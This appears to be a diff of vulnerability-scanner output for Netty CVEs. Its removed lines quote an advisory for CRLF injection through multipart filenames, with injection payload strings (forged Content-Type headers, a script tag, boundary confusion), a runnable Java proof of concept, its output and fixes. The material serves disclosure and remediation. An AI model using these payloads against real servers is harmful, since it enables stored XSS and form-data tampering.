-                        │      │                   content-type: image/jpeg                   <-- Original (now
-                        │      │                    ignored by many parsers)
-                        │      │                   ...
-                        │      │                   If the receiving server parses the **first** `Content-Type`,
-                        │      │                    the file is treated as HTML instead of JPEG, enabling XSS
-                        │      │                   when the file is served back.
-                        │      │                   ### Scenario 2: Arbitrary MIME Header Injection
-                        │      │                   String filename = "doc.pdf\"\r\nX-Custom-Auth:
-                        │      │                   admin-token-12345\r\nX-Bypass-Check: true";
-                        │      │                   Injects arbitrary headers into the multipart body part that
-                        │      │                   may be processed by downstream middleware or application
-                        │      │                   logic.
-                        │      │                   ### Scenario 3: Multipart Boundary Confusion
-                        │      │                   String filename = "file.txt\"\r\n\r\nmalicious body
-                        │      │                   content\r\n--boundary\r\nContent-Disposition: form-data;
-                        │      │                   name=\"secret";
-                        │      │                   By injecting a new boundary delimiter, the attacker can:
-                        │      │                   - Terminate the current body part prematurely
-                        │      │                   - Start a new body part with a different field name
-                        │      │                   - Override form fields processed by the server
-                        │      │                   ## 6. Proof of Concept
-                        │      │                   ### Full Runnable PoC Source Code
-                        │      │                   (MultipartFilenameInjectionPoC.java)
-                        │      │                   import io.netty.buffer.ByteBuf;
-                        │      │                   import io.netty.buffer.Unpooled;
-                        │      │                   import io.netty.handler.codec.http.*;
-                        │      │                   import io.netty.handler.codec.http.multipart.*;
-                        │      │                   import java.io.File;
-                        │      │                   import java.io.FileWriter;
-                        │      │                   import java.nio.charset.StandardCharsets;
-                        │      │                   /**
-                        │      │                    * PoC: HTTP Multipart Content-Disposition Header Injection
-                        │      │                   via Filename
-                        │      │                    *
-                        │      │                    * Demonstrates that HttpPostRequestEncoder does not
-                        │      │                   validate filenames
-                        │      │                    * for CRLF characters, allowing injection of arbitrary MIME
-                        │      │                    headers
-                        │      │                    * into multipart form data.
-                        │      │                    */
-                        │      │                   public class MultipartFilenameInjectionPoC {
-                        │      │                       public static void main(String[] args) throws Exception
-                        │      │                   {
-                        │      │                           System.out.println("=== Netty Multipart Filename
-                        │      │                   CRLF Injection PoC ===\n");
-                        │      │                           testFilenameInjection();
-                        │      │                           System.out.println("\n=== PoC Complete ===");
-                        │      │                       }
-                        │      │                       static void testFilenameInjection() throws Exception {
-                        │      │                           System.out.println("[TEST 1] Filename CRLF Injection
-                        │      │                    in Content-Disposition");
-                        │      │                          
-                        │      │                   System.out.println("----------------------------------------
-                        │      │                   ---------------");
-                        │      │                           // Create a temporary file for upload
-                        │      │                           File tempFile = File.createTempFile("test",
-                        │      │                   ".txt");
-                        │      │                           tempFile.deleteOnExit();
-                        │      │                           try (FileWriter fw = new FileWriter(tempFile)) {
-                        │      │                               fw.write("test content");
-                        │      │                           }
-                        │      │                           // Malicious filename with CRLF to inject
-                        │      │                   Content-Type header
-                        │      │                           String maliciousFilename =
-                        │      │                               "innocent.txt\"\r\nContent-Type:
-                        │      │                   text/html\r\nX-Injected: true\r\n\r\n" +
-                        │      │                               "<script>alert(1)</script>\r\n--";
-                        │      │                           HttpRequest request = new DefaultHttpRequest(
-                        │      │                               HttpVersion.HTTP_1_1, HttpMethod.POST,
-                        │      │                   "/upload");
-                        │      │                           HttpPostRequestEncoder encoder = new
-                        │      │                   HttpPostRequestEncoder(
-                        │      │                                   new DefaultHttpDataFactory(false), request,
-                        │      │                   true,
-                        │      │                                   StandardCharsets.UTF_8,
-                        │      │                   HttpPostRequestEncoder.EncoderMode.RFC3986);
-                        │      │                           DiskFileUpload fileUpload = new DiskFileUpload(
-                        │      │                                   "file", maliciousFilename,
-                        │      │                   "application/octet-stream",
-                        │      │                                   "binary", StandardCharsets.UTF_8,
-                        │      │                   tempFile.length());
-                        │      │                           fileUpload.setContent(tempFile);
-                        │      │                           encoder.addBodyHttpData(fileUpload);
-                        │      │                           encoder.finalizeRequest();
-                        │      │                           // Read the encoded multipart body
-                        │      │                           StringBuilder body = new StringBuilder();
-                        │      │                           while (!encoder.isEndOfInput()) {
-                        │      │                               HttpContent chunk =
-                        │      │                   encoder.readChunk(Unpooled.buffer().alloc());
-                        │      │                               if (chunk != null) {
-                        │      │                                  
-                        │      │                   body.append(chunk.content().toString(StandardCharsets.UTF_8)
-                        │      │                   );
-                        │      │                                   chunk.release();
-                        │      │                               }
-                        │      │                           encoder.cleanFiles();
-                        │      │                           String encoded = body.toString();
-                        │      │                           System.out.println("Malicious filename: " +
-                        │      │                               maliciousFilename.replace("\r",
-                        │      │                   "\\r").replace("\n", "\\n"));
-                        │      │                           System.out.println();
-                        │      │                           System.out.println("Encoded multipart body:");
-                        │      │                           System.out.println("---");
-                        │      │                           for (String line : encoded.split("\n", -1)) {
-                        │      │                               System.out.println("  " + line.replace("\r",
-                        │      │                   "\\r"));
-                        │      │                           boolean hasInjectedHeader =
-                        │      │                   encoded.contains("X-Injected: true");
-                        │      │                           boolean hasInjectedScript =
-                        │      │                   encoded.contains("<script>");
-                        │      │                           System.out.println("Injected X-Injected header: " +
-                        │      │                   hasInjectedHeader);
-                        │      │                           System.out.println("Injected script tag: " +
-                        │      │                   hasInjectedScript);
-                        │      │                           System.out.println("VULNERABLE: " +
-                        │      │                               ((hasInjectedHeader || hasInjectedScript) ?
-                        │      │                                   "YES - MIME header injection!" : "NO"));
-                        │      │                           tempFile.delete();
-                        │      │                   ### How to Compile and Run
-                        │      │                   ```bash
-                        │      │                   # Build Netty (skip tests)
-                        │      │                   ./mvnw install -pl
-                        │      │                   common,buffer,codec,codec-base,codec-http,transport
-                        │      │                   -DskipTests \
-                        │      │                     -Dcheckstyle.skip=true -Denforcer.skip=true
-                        │      │                   -Djapicmp.skip=true \
-                        │      │                     -Danimal.sniffer.skip=true -Drevapi.skip=true
-                        │      │                   -Dforbiddenapis.skip=true \
-                        │      │                     -Dspotbugs.skip=true -q
-                        │      │                   # Set classpath
-                        │      │                   JARS=$(find ~/.m2/repository/io/netty -name "netty-*.jar"
-                        │      │                   -path "*/4.2.12.Final/*" \
-                        │      │                     | grep -v sources | grep -v javadoc | tr '\n' ':')
-                        │      │                   # Compile and run
-                        │      │                   javac -cp "$JARS" MultipartFilenameInjectionPoC.java
-                        │      │                   java -cp "$JARS:." MultipartFilenameInjectionPoC
-                        │      │                   ### PoC Execution Output (Verified on Netty 4.2.12.Final)
-                        │      │                   === Netty Multipart Filename CRLF Injection PoC ===
-                        │      │                   [TEST 1] Filename CRLF Injection in Content-Disposition
-                        │      │                   -------------------------------------------------------
-                        │      │                   Malicious filename: innocent.txt"\r\nContent-Type:
-                        │      │                   text/html\r\nX-Injected:
-                        │      │                   true\r\n\r\n<script>alert(1)</script>\r\n--
-                        │      │                   Encoded multipart body:
-                        │      │                   ---
-                        │      │                     --88aaade41dbb9f9f\r
-                        │      │                     content-disposition: form-data; name="file";
-                        │      │                   filename="innocent.txt"\r
-                        │      │                     Content-Type: text/html\r                          <--
-                        │      │                   INJECTED
-                        │      │                     X-Injected: true\r                                 <--
-                        │      │                     \r
-                        │      │                     <script>alert(1)</script>\r                        <--
-                        │      │                   INJECTED XSS
-                        │      │                     --"\r
-                        │      │                     content-length: 12\r
-                        │      │                     content-type: application/octet-stream\r
-                        │      │                     content-transfer-encoding: binary\r
-                        │      │                     test content\r
-                        │      │                     --88aaade41dbb9f9f--\r
-                        │      │                   Injected X-Injected header: true
-                        │      │                   Injected script tag: true
-                        │      │                   VULNERABLE: YES - MIME header injection!
-                        │      │                   === PoC Complete ===
-                        │      │                   ## 7. Impact Analysis
-                        │      │                   | Impact Category | Description |
-                        │      │                   |----------------|-------------|
-                        │      │                   | **Confidentiality** | HIGH — Injected headers may bypass
-                        │      │                   access controls or leak tokens |
-                        │      │                   | **Integrity** | HIGH — Content-Type override enables
-                        │      │                   stored XSS; field name injection allows form data
-                        │      │                   manipulation |
-                        │      │                   | **Content-Type Spoofing** | Override
-                        │      │                   `application/octet-stream` to `text/html` to serve
-                        │      │                   executable content |
-                        │      │                   | **Stored XSS** | Inject `<script>` tags via Content-Type
-                        │      │                   override when uploaded files are served back |
-                        │      │                   | **Form Field Override** | Inject new multipart boundaries
-                        │      │                   to create/override form fields |
-                        │      │                   | **Downstream Injection** | Custom MIME headers may affect
-                        │      │                   middleware, CDN, or storage layer behavior |
-                        │      │                   ## 8. Remediation Recommendations
-                        │      │                   ### Option 1: Validate in FileUpload.setFilename()
-                        │      │                   (Recommended)
-                        │      │                   // DiskFileUpload.java / MemoryFileUpload.java /
-                        │      │                   MixedFileUpload.java
-                        │      │                       ObjectUtil.checkNotNull(filename, "filename");
-                        │      │                       for (int i = 0; i < filename.length(); i++) {
-                        │      │                           char c = filename.charAt(i);
-                        │      │                           if (c == '\r' || c == '\n') {
-                        │      │                               throw new IllegalArgumentException(
-                        │      │                                   "filename contains prohibited CRLF character
-                        │      │                    at index " + i);
-                        │      │                       this.filename = filename;
-                        │      │                   ### Option 2: Sanitize in HttpPostRequestEncoder
-                        │      │                   (Defense-in-Depth)
-                        │      │                   Escape or reject CRLF characters when building
-                        │      │                   Content-Disposition headers:
-                        │      │                   // HttpPostRequestEncoder.java - add helper method
-                        │      │                   private static String sanitizeHeaderParam(String value) {
-                        │      │                       for (int i = 0; i < value.length(); i++) {
-                        │      │                           char c = value.charAt(i);
-                        │      │                           if (c == '\r' || c == '\n' || c == '"') {
-                        │      │                               throw new ErrorDataEncoderException(
-                        │      │                                   "Multipart parameter contains prohibited
-                        │      │                   character at index " + i);
-                        │      │                       return value;
-                        │      │                   // Then use in Content-Disposition construction:
-                        │      │                   internal.addValue(... + "=\"" +
-                        │      │                   sanitizeHeaderParam(fileUpload.getFilename()) + "\"\r\n");
-                        │      │                   ### Option 3: RFC 2231/5987 Encoding for Filenames
-                        │      │                   Use proper RFC 2231 encoding for filenames with special
-                        │      │                   characters:
-                        │      │                   // Encode filename per RFC 5987:
-                        │      │                   // filename*=UTF-8''encoded%20filename
-                        │      │                   String encodedFilename = "UTF-8''" +
-                        │      │                   URLEncoder.encode(filename, "UTF-8");
-                        │      │                   internal.addValue(... + "filename*=" + encodedFilename +
-                        │      │                   "\r\n");
-                        │      │                   ## 9. References
-                        │      │                   - [RFC 2183: Content-Disposition Header
-                        │      │                   Field](https://tools.ietf.org/html/rfc2183)
-                        │      │                   - [RFC 7578: Returning Values from Forms:
-                        │      │                   multipart/form-data](https://tools.ietf.org/html/rfc7578)
-                        │      │                   - [RFC 5987: Character Set and Language Encoding for HTTP
-                        │      │                   Header Field
-                        │      │                   Parameters](https://tools.ietf.org/html/rfc5987)
-                        │      │                   - [CWE-93: Improper Neutralization of CRLF
-                        │      │                   Sequences](https://cwe.mitre.org/data/definitions/93.html)
-                        │      │                   - [CWE-113: Improper Neutralization of CRLF Sequences in
-                        │      │                   HTTP
-                        │      │                   Headers](https://cwe.mitre.org/data/definitions/113.html)
-                        │      │                   - [GHSA-jq43-27x9-3v86: Netty SMTP Command Injection (same
-                        │      │                   pattern)](https://github.com/netty/netty/security/advisories
-                        │      │                   /GHSA-jq43-27x9-3v86)
-                        │      │                   - [GHSA-84h7-rjj3-6jx4: Netty HTTP CRLF Injection (same
-                        │      │                   /GHSA-84h7-rjj3-6jx4) 
+                        │      ├ Title           : io.netty/netty-codec-http: Netty: CRLF Injection via
+                        │      │                   Multipart Filename in Netty HttpPostRequestEncoder 
+                        │      ├ Description     : Netty is an asynchronous, event-driven network application
+                        │      │                   framework. Prior to versions 4.1.136.Final and 4.2.16.Final,
+                        │      │                    HttpPostRequestEncoder constructs multipart HTTP request
+                        │      │                   bodies by directly concatenating user-supplied filenames and
+                        │      │                    field names into Content-Disposition MIME headers without
+                        │      │                   validating or sanitizing CRLF characters (\r\n). Since MIME
+                        │      │                   headers are delimited by CRLF, an attacker who controls the
+                        │      │                   filename can inject arbitrary MIME headers into the
+                        │      │                   multipart body part. The root cause is that neither the
+                        │      │                   encoder nor the FileUpload implementations' setFilename()
+                        │      │                   methods, which only check for null, neutralize CRLF
+                        │      │                   characters before the filename is embedded into the header.
+                        │      │                   This issue has been fixed in versions 4.1.136.Final and
+                        │      │                   4.2.16.Final. 
                         │      ├ Severity        : MEDIUM 
-                        │      ├ VendorSeverity   ─ ghsa: 2 
-                        │      ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:A/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N 
-                        │      │                         ╰ V3Score : 5.7 
-                        │      ╰ References       ╭ [0]: https://github.com/netty/netty 
-                        │                         ├ [1]: https://github.com/netty/netty/releases/tag/netty-4.1.
-                        │                         │      136.Final 
-                        │                         ├ [2]: https://github.com/netty/netty/releases/tag/netty-4.2.
-                        │                         │      16.Final 
-                        │                         ╰ [3]: https://github.com/netty/netty/security/advisories/GHS
-                        │                                A-gcjf-9mgh-3p7g 
+                        │      ├ CweIDs           ─ [0]: CWE-93 
+                        │      ├ VendorSeverity   ╭ ghsa  : 2 
+                        │      │                  ╰ redhat: 2 
+                        │      ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:A/AC:L/PR:L/UI:N/S:U/C:N/I:H
+                        │      │                  │        │           /A:N 
+                        │      │                  │        ╰ V3Score : 5.7 
+                        │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:A/AC:L/PR:L/UI:N/S:U/C:N/I:H
+                        │      │                           │           /A:N 
+                        │      │                           ╰ V3Score : 5.7 
+                        │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-59921 
+                        │      │                  ├ [1]: https://github.com/netty/netty 
+                        │      │                  ├ [2]: https://github.com/netty/netty/releases/tag/netty-4.1.
+                        │      │                  │      136.Final 
+                        │      │                  ├ [3]: https://github.com/netty/netty/releases/tag/netty-4.2.
+                        │      │                  │      16.Final 
+                        │      │                  ├ [4]: https://github.com/netty/netty/security/advisories/GHS
+                        │      │                  │      A-gcjf-9mgh-3p7g 
+                        │      │                  ├ [5]: https://nvd.nist.gov/vuln/detail/CVE-2026-59921 
+                        │      │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-59921 
+                        │      ├ PublishedDate   : 2026-07-28T23:17:09.923Z 
+                        │      ╰ LastModifiedDate: 2026-07-28T23:17:09.923Z 
                         ╰ [12] ╭ VulnerabilityID : CVE-2026-59900 
                                ├ VendorIDs        ─ [0]: GHSA-c69g-56f8-xwqj 
                                ├ PkgName         : io.netty:netty-codec-http2 
@@ -1349,28 +1056,32 @@
                                │                          cosystem%3Amaven 
                                ├ Fingerprint     : sha256:d648ee30c1656a5d9c5afd93c0afff6ec97f81dfb90bbcc6c7e1e
                                │                   95ca0c0b8cf 
-                               ├ Title           : Netty: [codec-http2] Lack of Host Header Deduplication in
-                               │                   HTTP/2→HTTP/1.x Translation Leads to Request Routing
-                               │                   Bypass 
-                               ├ Description     : Netty's HTTP/2-to-HTTP/1.x translation layer
-                               │                   (`Http2StreamFrameToHttpObjectCodec` and
-                               │                   `InboundHttp2ToHttpAdapter`) fails to deduplicate or
-                               │                   validate `Host` headers when an HTTP/2 client supplies both
-                               │                   the `:authority` pseudo-header and a literal `host` header
-                               │                   in a single HEADERS frame. The translator maps `:authority`
-                               │                   to `Host` and separately copies the literal `host` header,
-                               │                   producing an `HttpRequest` object containing two `Host`
-                               │                   headers with attacker-controlled differing values. 
+                               ├ Title           : io.netty/netty-codec-http2: Netty: Improper header
+                               │                   neutralization in netty-codec-http2 
+                               ├ Description     : A flaw was found in Netty's netty-codec-http2 component. The
+                               │                    HTTP/2 encoder does not properly handle special characters
+                               │                   in HTTP headers. This vulnerability allows a remote attacker
+                               │                    to craft specific HTTP/2 requests, leading to HTTP response
+                               │                    splitting and header injection attacks. Such attacks can
+                               │                   enable an attacker to manipulate web content or inject
+                               │                   malicious headers. 
                                ├ Severity        : MEDIUM 
-                               ├ VendorSeverity   ─ ghsa: 2 
-                               ├ CVSS             ─ ghsa ╭ V40Vector: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI
-                               │                         │            :N/VA:N/SC:L/SI:L/SA:N 
-                               │                         ╰ V40Score : 6.9 
-                               ╰ References       ╭ [0]: https://github.com/netty/netty 
-                                                  ├ [1]: https://github.com/netty/netty/releases/tag/netty-4.1.
+                               ├ VendorSeverity   ╭ ghsa  : 2 
+                               │                  ╰ redhat: 2 
+                               ├ CVSS             ╭ ghsa   ╭ V40Vector: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/
+                               │                  │        │            VI:N/VA:N/SC:L/SI:L/SA:N 
+                               │                  │        ╰ V40Score : 6.9 
+                               │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:H
+                               │                           │           /A:N 
+                               │                           ╰ V3Score : 6.5 
+                               ╰ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-59900 
+                                                  ├ [1]: https://github.com/netty/netty 
+                                                  ├ [2]: https://github.com/netty/netty/releases/tag/netty-4.1.
                                                   │      136.Final 
-                                                  ├ [2]: https://github.com/netty/netty/releases/tag/netty-4.2.
+                                                  ├ [3]: https://github.com/netty/netty/releases/tag/netty-4.2.
                                                   │      16.Final 
-                                                  ╰ [3]: https://github.com/netty/netty/security/advisories/GHS
-                                                         A-c69g-56f8-xwqj 
+                                                  ├ [4]: https://github.com/netty/netty/security/advisories/GHS
+                                                  │      A-c69g-56f8-xwqj 
+                                                  ├ [5]: https://nvd.nist.gov/vuln/detail/CVE-2026-59900 
+                                                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-59900 
 ```
